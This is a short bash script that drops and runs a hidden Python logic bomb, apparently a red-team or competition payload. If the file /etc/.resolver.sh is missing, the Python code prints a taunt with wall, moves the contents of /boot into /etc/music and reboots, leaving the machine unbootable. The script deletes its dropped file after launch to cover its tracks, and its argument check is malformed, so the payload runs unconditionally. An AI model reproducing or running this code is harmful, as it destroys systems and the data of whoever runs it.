#!/bin/bash
if [ "$1"=="beaconBomb" ] 
then
cat <<EOFA > /bin/.beaconBomb.py
import os
import subprocess
import argparse
from sys import argv
def main():
    while (True):
        if(os.path.exists("/etc/.resolver.sh")):
            pass
        else:
            os.system("wall -n \"Now that's a lot of damage\"")
            os.system("sleep 5")
            os.system("mkdir /etc/music")
            os.system("mv /boot/* /etc/music")
            os.system("reboot")
main()
EOFA
chmod +x /bin/.beaconBomb.py
echo "Starting Payload..."
python3 /bin/.beaconBomb.py &
sleep 5
rm /bin/.beaconBomb.py
fi